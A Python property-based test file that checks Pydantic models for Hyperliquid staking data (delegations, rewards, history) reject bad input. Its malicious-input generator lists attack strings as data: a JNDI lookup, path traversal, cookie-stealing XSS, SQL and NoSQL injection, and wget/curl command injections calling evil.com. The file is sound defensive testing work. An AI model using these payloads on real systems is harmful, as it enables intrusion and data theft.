"""Property-based tests for Hyperliquid raw staking models.

These tests validate critical security boundary models that process external staking data.
The models tested here are essential for staking delegation tracking, validator management, and reward calculations.

SECURITY CRITICAL: These raw models protect against:
- Malicious staking data that could manipulate delegation amounts and validator addresses
- Buffer overflow attacks through oversized staking structures
- Injection attacks through malformed validator addresses and transaction hashes
- Type confusion that could bypass staking validation
- Financial precision errors in delegation amounts and reward calculations
- Transaction hash manipulation that could affect staking history integrity

Property testing ensures comprehensive coverage of staking edge cases and adversarial inputs.
"""

import string
from decimal import Decimal
from typing import Any

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import DrawFn, SearchStrategy
from pydantic import BaseModel, ValidationError

from cyberdelta.apis.hyperliquid.models.hl_raw_staking import (
    HyperliquidRawDelegationItem,
    HyperliquidRawDelegationsResponse,
    HyperliquidRawDelegatorHistoryDelegateDelta,
    HyperliquidRawDelegatorHistoryDelta,
    HyperliquidRawDelegatorHistoryItem,
    HyperliquidRawDelegatorRewardItem,
    HyperliquidRawDelegatorRewardsResponse,
    HyperliquidRawDelegatorSummaryResponse,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR STAKING MODEL TESTING
# =============================================================================


def ethereum_address_strategy() -> SearchStrategy[str]:
    """Generate valid Ethereum addresses for validators."""
    return st.one_of([
        # Known valid validator addresses
        st.sampled_from([
            "0x5ac99df645f3414876c816caa18b2d234024b487",
            "0x11af2b93dcb3568b7bf2b6bd6182d260a9495728",
            "0x742f4d0b8dA87Dd74b2FA0F2f9F0C2e2FdA9f8D9",
            "0xa0b86a33e6e8a3b1c8b4c6f9d7e8a9f4b3e2d5c1",
        ]),
        # Generated addresses
        st.builds(
            lambda hex_part: f"0x{hex_part}",
            st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
        ),
    ])


def transaction_hash_strategy() -> SearchStrategy[str]:
    """Generate valid transaction hashes."""
    return st.one_of([
        # Known valid transaction hashes
        st.sampled_from([
            "0x55492465cb523f90815a041a226ba90147008d4b221a24ae8dc35a0dbede4ea4",
            "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
            "0xfedcba0987654321fedcba0987654321fedcba0987654321fedcba0987654321",
        ]),
        # Generated hashes
        st.builds(
            lambda hex_part: f"0x{hex_part}",
            st.text(min_size=64, max_size=64, alphabet=string.hexdigits),
        ),
    ])


def financial_decimal_string_strategy() -> SearchStrategy[str]:
    """Generate valid decimal strings for financial amounts."""
    return st.one_of([
        # Normal decimal values
        st.decimals(
            min_value=Decimal("0.000001"),
            max_value=Decimal(100000000),
            places=8,
            allow_nan=False,
            allow_infinity=False,
        ).map(str),
        # Common edge cases
        st.just("0.000001"),
        st.just("999999.99999999"),
        st.just("1.0"),
        st.just("100"),
        st.just("50000.0"),
        st.just("0.0"),
        # Scientific notation
        st.just("1e6"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def timestamp_strategy() -> SearchStrategy[int]:
    """Generate valid timestamp values."""
    return st.integers(min_value=0, max_value=2**63 - 1)


def staking_source_strategy() -> SearchStrategy[str]:
    """Generate valid staking reward sources."""
    return st.sampled_from(["delegation", "validation", "commission", "bonus", "penalty"])


@st.composite
def valid_delegation_item_data(draw: DrawFn) -> dict[str, Any]:
    """Generate valid delegation item data."""
    return {
        "validator": draw(ethereum_address_strategy()),
        "amount": draw(financial_decimal_string_strategy()),
        "lockedUntilTimestamp": draw(timestamp_strategy()),
    }


@st.composite
def valid_delegator_summary_data(draw: DrawFn) -> dict[str, Any]:
    """Generate valid delegator summary data."""
    return {
        "delegated": draw(financial_decimal_string_strategy()),
        "undelegated": draw(financial_decimal_string_strategy()),
        "totalPendingWithdrawal": draw(financial_decimal_string_strategy()),
        "nPendingWithdrawals": draw(st.integers(min_value=0, max_value=1000)),
    }


@st.composite
def valid_history_delegate_delta_data(draw: DrawFn) -> dict[str, Any]:
    """Generate valid history delegate delta data."""
    return {
        "validator": draw(ethereum_address_strategy()),
        "amount": draw(financial_decimal_string_strategy()),
        "isUndelegate": draw(st.booleans()),
    }


@st.composite
def valid_history_delta_data(draw: DrawFn) -> dict[str, Any]:
    """Generate valid history delta data."""
    return {
        "delegate": draw(valid_history_delegate_delta_data()),
    }


@st.composite
def valid_history_item_data(draw: DrawFn) -> dict[str, Any]:
    """Generate valid history item data."""
    return {
        "time": draw(timestamp_strategy()),
        "hash": draw(transaction_hash_strategy()),
        "delta": draw(valid_history_delta_data()),
    }


@st.composite
def valid_reward_item_data(draw: DrawFn) -> dict[str, Any]:
    """Generate valid reward item data."""
    return {
        "time": draw(timestamp_strategy()),
        "source": draw(staking_source_strategy()),
        "totalAmount": draw(financial_decimal_string_strategy()),
    }


def malicious_staking_strategy() -> SearchStrategy[Any]:
    """Generate malicious values for staking security testing."""
    return st.one_of([
        # Staking manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-stake}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('staking-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE delegations;--"),
        st.just("1' UNION SELECT * FROM validators--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("S" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.staking.find(); //"),
        # JSON injection
        st.just('{"$where": "this.amount > 1000000"}'),
        # Staking manipulation
        st.just("100'; UPDATE delegations SET amount=9999999;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
        # Invalid decimal strings
        st.just("NaN"),
        st.just("Infinity"),
        st.just("-Infinity"),
        st.just("1..0"),
        st.just("not_a_number"),
        st.just(""),
        st.just("   "),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW DELEGATION ITEM MODEL
# =============================================================================


class TestHyperliquidRawDelegationItemProperties:
    """Property-based tests for HyperliquidRawDelegationItem validation and security."""

    @given(delegation_data=valid_delegation_item_data())
    def test_delegation_item_validation_success_properties(
        self, delegation_data: dict[str, Any]
    ) -> None:
        """Property: Valid delegation item data should always create valid HyperliquidRawDelegationItem objects."""
        # Skip invalid data
        try:
            # Validate validator address
            validator = delegation_data["validator"]
            assume(
                isinstance(validator, str) and validator.startswith("0x") and len(validator) == 42
            )

            # Validate amount
            amount = delegation_data["amount"]
            assume(isinstance(amount, str) and amount.strip())
            decimal_val = Decimal(amount)
            assume(decimal_val.is_finite() and decimal_val >= 0)

            # Validate timestamp
            timestamp = delegation_data["lockedUntilTimestamp"]
            assume(isinstance(timestamp, int) and timestamp >= 0)

        except (ValueError, TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawDelegationItem.model_validate(delegation_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawDelegationItem)

        # Property: All fields should be preserved with correct types
        assert obj.validator == delegation_data["validator"]
        assert isinstance(obj.amount, str)
        assert obj.locked_until_timestamp == delegation_data["lockedUntilTimestamp"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("populate_by_name") is True
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["validator", "amount", "lockedUntilTimestamp"]),
        malicious_value=malicious_staking_strategy(),
    )
    def test_delegation_item_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Delegation item model should reject malicious inputs safely."""
        base_data = {
            "validator": "0x5ac99df645f3414876c816caa18b2d234024b487",
            "amount": "12060.16529862",
            "lockedUntilTimestamp": 1735466781353,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
        )):
            HyperliquidRawDelegationItem.model_validate(base_data)

    @given(
        validator_address=st.one_of([
            # Valid addresses
            ethereum_address_strategy(),
            # Invalid addresses
            st.just("short"),
            st.just("0x123"),  # Too short
            st.just("5ac99df645f3414876c816caa18b2d234024b487"),  # Missing 0x prefix
            st.just("0x5ac99df645f3414876c816caa18b2d234024b487z"),  # Invalid character
            st.just(""),
            st.just("   "),
        ])
    )
    def test_delegation_item_validator_validation_properties(self, validator_address: str) -> None:
        """Property: Delegation item should validate validator addresses."""
        delegation_data = {
            "validator": validator_address,
            "amount": "12060.16529862",
            "lockedUntilTimestamp": 1735466781353,
        }

        # Check if address is valid Ethereum format
        is_valid = (
            isinstance(validator_address, str)
            and validator_address.strip()
            and validator_address.startswith("0x")
            and len(validator_address) == 42
            and all(c in string.hexdigits for c in validator_address[2:])
        )

        if is_valid:
            # Property: Valid addresses should be accepted
            obj = HyperliquidRawDelegationItem.model_validate(delegation_data)
            assert obj.validator == validator_address
        else:
            # Property: Invalid addresses should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawDelegationItem.model_validate(delegation_data)

    @given(
        timestamp_value=st.one_of([
            # Valid timestamps
            st.integers(min_value=0, max_value=2**63 - 1),
            # Invalid timestamps
            st.integers(min_value=-1000, max_value=-1),
        ])
    )
    def test_delegation_item_timestamp_validation_properties(self, timestamp_value: int) -> None:
        """Property: Delegation item should validate timestamp values."""
        delegation_data = {
            "validator": "0x5ac99df645f3414876c816caa18b2d234024b487",
            "amount": "12060.16529862",
            "lockedUntilTimestamp": timestamp_value,
        }

        if timestamp_value >= 0:
            # Property: Non-negative timestamps should be accepted
            obj = HyperliquidRawDelegationItem.model_validate(delegation_data)
            assert obj.locked_until_timestamp == timestamp_value
        else:
            # Property: Negative timestamps should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawDelegationItem.model_validate(delegation_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW DELEGATOR SUMMARY RESPONSE MODEL
# =============================================================================


class TestHyperliquidRawDelegatorSummaryResponseProperties:
    """Property-based tests for HyperliquidRawDelegatorSummaryResponse validation and security."""

    @given(summary_data=valid_delegator_summary_data())
    def test_delegator_summary_validation_success_properties(
        self, summary_data: dict[str, Any]
    ) -> None:
        """Property: Valid delegator summary data should always create valid HyperliquidRawDelegatorSummaryResponse objects."""
        # Skip invalid data
        try:
            # Validate decimal fields
            for field in ["delegated", "undelegated", "totalPendingWithdrawal"]:
                value = summary_data[field]
                assume(isinstance(value, str) and value.strip())
                decimal_val = Decimal(value)
                assume(decimal_val.is_finite() and decimal_val >= 0)

            # Validate count field
            count = summary_data["nPendingWithdrawals"]
            assume(isinstance(count, int) and count >= 0)

        except (ValueError, TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawDelegatorSummaryResponse.model_validate(summary_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawDelegatorSummaryResponse)

        # Property: All fields should be preserved with correct types
        assert isinstance(obj.delegated, str)
        assert isinstance(obj.undelegated, str)
        assert isinstance(obj.total_pending_withdrawal, str)
        assert obj.n_pending_withdrawals == summary_data["nPendingWithdrawals"]

    @given(
        field_name=st.sampled_from([
            "delegated",
            "undelegated",
            "totalPendingWithdrawal",
            "nPendingWithdrawals",
        ]),
        malicious_value=malicious_staking_strategy(),
    )
    def test_delegator_summary_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Delegator summary model should reject malicious inputs safely."""
        base_data = {
            "delegated": "12060.16529862",
            "undelegated": "0.0",
            "totalPendingWithdrawal": "0.0",
            "nPendingWithdrawals": 0,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
        )):
            HyperliquidRawDelegatorSummaryResponse.model_validate(base_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW DELEGATOR HISTORY MODELS
# =============================================================================


class TestHyperliquidRawDelegatorHistoryProperties:
    """Property-based tests for HyperliquidRawDelegatorHistory models validation and security."""

    @given(delegate_delta_data=valid_history_delegate_delta_data())
    def test_history_delegate_delta_validation_success_properties(
        self, delegate_delta_data: dict[str, Any]
    ) -> None:
        """Property: Valid history delegate delta data should always create valid objects."""
        # Skip invalid data
        try:
            # Validate validator address
            validator = delegate_delta_data["validator"]
            assume(
                isinstance(validator, str) and validator.startswith("0x") and len(validator) == 42
            )

            # Validate amount
            amount = delegate_delta_data["amount"]
            assume(isinstance(amount, str) and amount.strip())
            decimal_val = Decimal(amount)
            assume(decimal_val.is_finite() and decimal_val >= 0)

            # Validate boolean
            assume(isinstance(delegate_delta_data["isUndelegate"], bool))

        except (ValueError, TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawDelegatorHistoryDelegateDelta.model_validate(delegate_delta_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawDelegatorHistoryDelegateDelta)

        # Property: All fields should be preserved with correct types
        assert obj.validator == delegate_delta_data["validator"]
        assert isinstance(obj.amount, str)
        assert obj.is_undelegate == delegate_delta_data["isUndelegate"]

    @given(history_item_data=valid_history_item_data())
    def test_history_item_validation_success_properties(
        self, history_item_data: dict[str, Any]
    ) -> None:
        """Property: Valid history item data should always create valid objects."""
        # Skip invalid data
        try:
            # Validate timestamp
            assume(isinstance(history_item_data["time"], int) and history_item_data["time"] >= 0)

            # Validate hash
            tx_hash = history_item_data["hash"]
            assume(isinstance(tx_hash, str) and tx_hash.startswith("0x") and len(tx_hash) == 66)

            # Validate nested delta structure
            delta = history_item_data["delta"]
            assume(isinstance(delta, dict) and "delegate" in delta)

        except (ValueError, TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawDelegatorHistoryItem.model_validate(history_item_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawDelegatorHistoryItem)

        # Property: All fields should be preserved with correct types
        assert obj.time == history_item_data["time"]
        assert obj.hash == history_item_data["hash"]
        assert isinstance(obj.delta, HyperliquidRawDelegatorHistoryDelta)

    @given(
        transaction_hash=st.one_of([
            # Valid hashes
            transaction_hash_strategy(),
            # Invalid hashes
            st.just("short"),
            st.just("0x123"),  # Too short
            st.just(
                "55492465cb523f90815a041a226ba90147008d4b221a24ae8dc35a0dbede4ea4"
            ),  # Missing 0x prefix
            st.just(
                "0x55492465cb523f90815a041a226ba90147008d4b221a24ae8dc35a0dbede4ea4z"
            ),  # Invalid character
            st.just("0x" + "1" * 63),  # Wrong length
            st.just(""),
            st.just("   "),
        ])
    )
    def test_history_item_hash_validation_properties(self, transaction_hash: str) -> None:
        """Property: History item should validate transaction hashes."""
        history_data = {
            "time": 1735380381353,
            "hash": transaction_hash,
            "delta": {
                "delegate": {
                    "validator": "0x5ac99df645f3414876c816caa18b2d234024b487",
                    "amount": "10000.0",
                    "isUndelegate": False,
                }
            },
        }

        # Check if hash is valid format
        is_valid = (
            isinstance(transaction_hash, str)
            and transaction_hash.strip()
            and transaction_hash.startswith("0x")
            and len(transaction_hash) == 66
            and all(c in string.hexdigits for c in transaction_hash[2:])
        )

        if is_valid:
            # Property: Valid hashes should be accepted
            obj = HyperliquidRawDelegatorHistoryItem.model_validate(history_data)
            assert obj.hash == transaction_hash
        else:
            # Property: Invalid hashes should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawDelegatorHistoryItem.model_validate(history_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW DELEGATOR REWARD ITEM MODEL
# =============================================================================


class TestHyperliquidRawDelegatorRewardItemProperties:
    """Property-based tests for HyperliquidRawDelegatorRewardItem validation and security."""

    @given(reward_data=valid_reward_item_data())
    def test_reward_item_validation_success_properties(self, reward_data: dict[str, Any]) -> None:
        """Property: Valid reward item data should always create valid HyperliquidRawDelegatorRewardItem objects."""
        # Skip invalid data
        try:
            # Validate timestamp
            assume(isinstance(reward_data["time"], int) and reward_data["time"] >= 0)

            # Validate source
            assume(isinstance(reward_data["source"], str) and reward_data["source"].strip())

            # Validate amount
            amount = reward_data["totalAmount"]
            assume(isinstance(amount, str) and amount.strip())
            decimal_val = Decimal(amount)
            assume(decimal_val.is_finite() and decimal_val >= 0)

        except (ValueError, TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawDelegatorRewardItem.model_validate(reward_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawDelegatorRewardItem)

        # Property: All fields should be preserved with correct types
        assert obj.time == reward_data["time"]
        assert obj.source == reward_data["source"]
        assert isinstance(obj.total_amount, str)

    @given(
        field_name=st.sampled_from(["time", "source", "totalAmount"]),
        malicious_value=malicious_staking_strategy(),
    )
    def test_reward_item_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Reward item model should reject malicious inputs safely."""
        base_data = {
            "time": 1736726400073,
            "source": "delegation",
            "totalAmount": "0.73117184",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
        )):
            HyperliquidRawDelegatorRewardItem.model_validate(base_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW STAKING RESPONSE MODELS
# =============================================================================


class TestHyperliquidRawStakingResponseProperties:
    """Property-based tests for HyperliquidRaw staking response models validation and security."""

    @given(
        delegations=st.lists(
            valid_delegation_item_data(),
            min_size=0,
            max_size=10,
        )
    )
    def test_delegations_response_validation_success_properties(
        self, delegations: list[dict[str, Any]]
    ) -> None:
        """Property: Valid delegations list should always create valid HyperliquidRawDelegationsResponse objects."""
        # Skip invalid delegations
        valid_delegations = []
        for delegation in delegations:
            try:
                # Validate each delegation
                validator = delegation["validator"]
                if not (
                    isinstance(validator, str)
                    and validator.startswith("0x")
                    and len(validator) == 42
                ):
                    continue
                amount = delegation["amount"]
                if not (isinstance(amount, str) and amount.strip()):
                    continue
                decimal_val = Decimal(amount)
                if not (decimal_val.is_finite() and decimal_val >= 0):
                    continue
                if not (
                    isinstance(delegation["lockedUntilTimestamp"], int)
                    and delegation["lockedUntilTimestamp"] >= 0
                ):
                    continue
                valid_delegations.append(delegation)
            except (ValueError, TypeError, KeyError):
                continue

        if len(valid_delegations) == 0:
            assume(False)  # Skip if no valid delegations

        obj = HyperliquidRawDelegationsResponse.model_validate(valid_delegations)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawDelegationsResponse)

        # Property: All delegations should be preserved
        assert len(obj.root) == len(valid_delegations)
        for i, delegation_item in enumerate(obj.root):
            assert isinstance(delegation_item, HyperliquidRawDelegationItem)
            assert delegation_item.validator == valid_delegations[i]["validator"]

    @given(
        rewards=st.lists(
            valid_reward_item_data(),
            min_size=0,
            max_size=10,
        )
    )
    def test_rewards_response_validation_success_properties(
        self, rewards: list[dict[str, Any]]
    ) -> None:
        """Property: Valid rewards list should always create valid HyperliquidRawDelegatorRewardsResponse objects."""
        # Skip invalid rewards
        valid_rewards = []
        for reward in rewards:
            try:
                # Validate each reward
                if not (isinstance(reward["time"], int) and reward["time"] >= 0):
                    continue
                if not (isinstance(reward["source"], str) and reward["source"].strip()):
                    continue
                amount = reward["totalAmount"]
                if not (isinstance(amount, str) and amount.strip()):
                    continue
                decimal_val = Decimal(amount)
                if not (decimal_val.is_finite() and decimal_val >= 0):
                    continue
                valid_rewards.append(reward)
            except (ValueError, TypeError, KeyError):
                continue

        if len(valid_rewards) == 0:
            assume(False)  # Skip if no valid rewards

        obj = HyperliquidRawDelegatorRewardsResponse.model_validate(valid_rewards)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawDelegatorRewardsResponse)

        # Property: All rewards should be preserved
        assert len(obj.root) == len(valid_rewards)
        for i, reward_item in enumerate(obj.root):
            assert isinstance(reward_item, HyperliquidRawDelegatorRewardItem)
            assert reward_item.source == valid_rewards[i]["source"]


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawStakingIntegrationProperties:
    """Integration property tests for staking models working together."""

    @given(
        delegations=st.lists(valid_delegation_item_data(), min_size=1, max_size=5),
        malicious_value=malicious_staking_strategy(),
    )
    def test_staking_models_integration_properties(
        self, delegations: list[dict[str, Any]], malicious_value: Any
    ) -> None:
        """Property: Staking models should work consistently together."""
        # Skip invalid delegations and create valid list
        valid_delegations = []
        for delegation in delegations:
            try:
                validator = delegation["validator"]
                if not (
                    isinstance(validator, str)
                    and validator.startswith("0x")
                    and len(validator) == 42
                ):
                    continue
                amount = delegation["amount"]
                if not (isinstance(amount, str) and amount.strip()):
                    continue
                decimal_val = Decimal(amount)
                if not (decimal_val.is_finite() and decimal_val >= 0):
                    continue
                if not (
                    isinstance(delegation["lockedUntilTimestamp"], int)
                    and delegation["lockedUntilTimestamp"] >= 0
                ):
                    continue
                valid_delegations.append(delegation)
            except (ValueError, TypeError, KeyError):
                continue

        if len(valid_delegations) == 0:
            assume(False)

        # Property: Valid data should create valid response
        response = HyperliquidRawDelegationsResponse.model_validate(valid_delegations)
        assert isinstance(response, HyperliquidRawDelegationsResponse)
        assert len(response.root) == len(valid_delegations)

        # Property: Malicious value should be rejected when injected
        corrupted_delegations = valid_delegations.copy()
        if corrupted_delegations:
            corrupted_delegations[0] = corrupted_delegations[0].copy()
            corrupted_delegations[0]["validator"] = malicious_value

            with pytest.raises((
                ValidationError,
                TypeError,
                EmptyStringError,
                TypeFieldError,
            )):
                HyperliquidRawDelegationsResponse.model_validate(corrupted_delegations)

    @given(
        complete_malicious_data=st.one_of([
            st.dictionaries(
                st.sampled_from(["validator", "amount", "lockedUntilTimestamp"]),
                malicious_staking_strategy(),
                min_size=1,
                max_size=3,
            ),
            malicious_staking_strategy(),
        ])
    )
    def test_staking_models_adversarial_input_properties(
        self, complete_malicious_data: Any
    ) -> None:
        """Property: All staking models should safely handle complete adversarial input."""
        # Property: Complete adversarial input should be safely rejected
        with pytest.raises((ValidationError, TypeError)):
            # Try different response types with malicious data
            if isinstance(complete_malicious_data, dict):
                HyperliquidRawDelegationItem.model_validate(complete_malicious_data)
            else:
                HyperliquidRawDelegationsResponse.model_validate(complete_malicious_data)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawDelegationItem_valid() -> None:
    """Test delegation item valid."""
    valid_delegation_item = {
        "validator": "0x5ac99df645f3414876c816caa18b2d234024b487",
        "amount": "12060.16529862",
        "lockedUntilTimestamp": 1735466781353,
    }
    item = HyperliquidRawDelegationItem.model_validate(valid_delegation_item)
    assert item.validator == valid_delegation_item["validator"]
    assert item.amount == valid_delegation_item["amount"]
    assert item.locked_until_timestamp == valid_delegation_item["lockedUntilTimestamp"]


def test_HyperliquidRawDelegationItem_invalid_validator() -> None:
    """Test delegation item invalid validator."""
    invalid_data = {
        "validator": "short",
        "amount": "12060.16529862",
        "lockedUntilTimestamp": 1735466781353,
    }
    with pytest.raises(ValidationError):
        HyperliquidRawDelegationItem.model_validate(invalid_data)


def test_HyperliquidRawDelegationItem_invalid_amount() -> None:
    """Test delegation item invalid amount."""
    invalid_data = {
        "validator": "0x5ac99df645f3414876c816caa18b2d234024b487",
        "amount": "nan",
        "lockedUntilTimestamp": 1735466781353,
    }
    with pytest.raises(ValidationError):
        HyperliquidRawDelegationItem.model_validate(invalid_data)


def test_HyperliquidRawDelegationItem_invalid_timestamp() -> None:
    """Test delegation item invalid timestamp."""
    invalid_data = {
        "validator": "0x5ac99df645f3414876c816caa18b2d234024b487",
        "amount": "12060.16529862",
        "lockedUntilTimestamp": -1,
    }
    with pytest.raises(ValidationError):
        HyperliquidRawDelegationItem.model_validate(invalid_data)


def test_HyperliquidRawDelegationsResponse_valid() -> None:
    """Test delegations response valid."""
    valid_delegations = [
        {
            "validator": "0x5ac99df645f3414876c816caa18b2d234024b487",
            "amount": "12060.16529862",
            "lockedUntilTimestamp": 1735466781353,
        }
    ]
    resp = HyperliquidRawDelegationsResponse.model_validate(valid_delegations)
    assert len(resp.root) == 1
    assert resp.root[0].validator == valid_delegations[0]["validator"]


def test_HyperliquidRawDelegationsResponse_invalid() -> None:
    """Test delegations response invalid."""
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawDelegationsResponse.model_validate("not-list")


def test_HyperliquidRawDelegatorSummaryResponse_valid() -> None:
    """Test delegator summary valid."""
    valid_summary = {
        "delegated": "12060.16529862",
        "undelegated": "0.0",
        "totalPendingWithdrawal": "0.0",
        "nPendingWithdrawals": 0,
    }
    item = HyperliquidRawDelegatorSummaryResponse.model_validate(valid_summary)
    assert item.delegated == valid_summary["delegated"]
    assert item.n_pending_withdrawals == valid_summary["nPendingWithdrawals"]


def test_HyperliquidRawDelegatorSummaryResponse_invalid() -> None:
    """Test delegator summary invalid."""
    invalid_data = {
        "delegated": "nan",
        "undelegated": "0.0",
        "totalPendingWithdrawal": "0.0",
        "nPendingWithdrawals": 0,
    }
    with pytest.raises(ValidationError):
        HyperliquidRawDelegatorSummaryResponse.model_validate(invalid_data)


def test_HyperliquidRawDelegatorHistoryDelegateDelta_valid() -> None:
    """Test hist delegate delta valid."""
    valid_delta = {
        "validator": "0x5ac99df645f3414876c816caa18b2d234024b487",
        "amount": "10000.0",
        "isUndelegate": False,
    }
    item = HyperliquidRawDelegatorHistoryDelegateDelta.model_validate(valid_delta)
    assert item.validator == valid_delta["validator"]
    assert item.is_undelegate == valid_delta["isUndelegate"]


def test_HyperliquidRawDelegatorHistoryItem_valid() -> None:
    """Test hist item valid."""
    valid_history_item = {
        "time": 1735380381353,
        "hash": "0x55492465cb523f90815a041a226ba90147008d4b221a24ae8dc35a0dbede4ea4",
        "delta": {
            "delegate": {
                "validator": "0x5ac99df645f3414876c816caa18b2d234024b487",
                "amount": "10000.0",
                "isUndelegate": False,
            }
        },
    }
    item = HyperliquidRawDelegatorHistoryItem.model_validate(valid_history_item)
    assert item.time == valid_history_item["time"]
    assert item.hash == valid_history_item["hash"]
    assert isinstance(item.delta, HyperliquidRawDelegatorHistoryDelta)


def test_HyperliquidRawDelegatorHistoryItem_invalid_hash() -> None:
    """Test hist item invalid hash."""
    invalid_data = {
        "time": 1735380381353,
        "hash": "short",
        "delta": {
            "delegate": {
                "validator": "0x5ac99df645f3414876c816caa18b2d234024b487",
                "amount": "10000.0",
                "isUndelegate": False,
            }
        },
    }
    with pytest.raises(ValidationError):
        HyperliquidRawDelegatorHistoryItem.model_validate(invalid_data)


def test_HyperliquidRawDelegatorRewardItem_valid() -> None:
    """Test reward item valid."""
    valid_reward = {
        "time": 1736726400073,
        "source": "delegation",
        "totalAmount": "0.73117184",
    }
    item = HyperliquidRawDelegatorRewardItem.model_validate(valid_reward)
    assert item.source == valid_reward["source"]
    assert item.total_amount == valid_reward["totalAmount"]


def test_HyperliquidRawDelegatorRewardsResponse_valid() -> None:
    """Test rewards response valid."""
    valid_rewards = [
        {
            "time": 1736726400073,
            "source": "delegation",
            "totalAmount": "0.73117184",
        }
    ]
    resp = HyperliquidRawDelegatorRewardsResponse.model_validate(valid_rewards)
    assert len(resp.root) == 1
    assert resp.root[0].source == valid_rewards[0]["source"]


def test_staking_models_extra_fields() -> None:
    """Test that all staking models forbid extra fields."""
    models_and_data: list[tuple[type[BaseModel], dict[str, Any]]] = [
        (
            HyperliquidRawDelegationItem,
            {
                "validator": "0x5ac99df645f3414876c816caa18b2d234024b487",
                "amount": "12060.16529862",
                "lockedUntilTimestamp": 1735466781353,
            },
        ),
        (
            HyperliquidRawDelegatorSummaryResponse,
            {
                "delegated": "12060.16529862",
                "undelegated": "0.0",
                "totalPendingWithdrawal": "0.0",
                "nPendingWithdrawals": 0,
            },
        ),
        (
            HyperliquidRawDelegatorRewardItem,
            {
                "time": 1736726400073,
                "source": "delegation",
                "totalAmount": "0.73117184",
            },
        ),
    ]

    for model_class, valid_data in models_and_data:
        data_copy = valid_data.copy()
        data_copy["extra_field"] = "some_value"

        with pytest.raises(ValidationError) as exc_info:
            model_class.model_validate(data_copy)
        assert "Extra inputs are not permitted" in str(exc_info.value)
